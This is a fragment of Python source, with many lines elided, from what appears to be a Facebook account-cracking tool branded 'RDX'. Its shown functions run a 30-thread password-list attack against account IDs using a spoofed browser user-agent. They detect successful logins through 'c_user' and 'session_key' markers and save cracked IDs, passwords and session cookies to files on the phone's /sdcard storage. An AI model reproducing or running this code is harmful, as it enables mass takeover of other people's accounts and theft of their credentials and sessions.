...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/RDX.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        linex()
                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/RDX-OK.TXT")
                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/RDX-CP.TXT")
                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/RDX-COOKIE.TXT")
                                        linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [RDX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
                        ...
                        if "c_user" in RDX:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RDX-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("Cookie: "+coki)
                                        open('/sdcard/RDX-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/RDX-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [RDX-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RDX-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
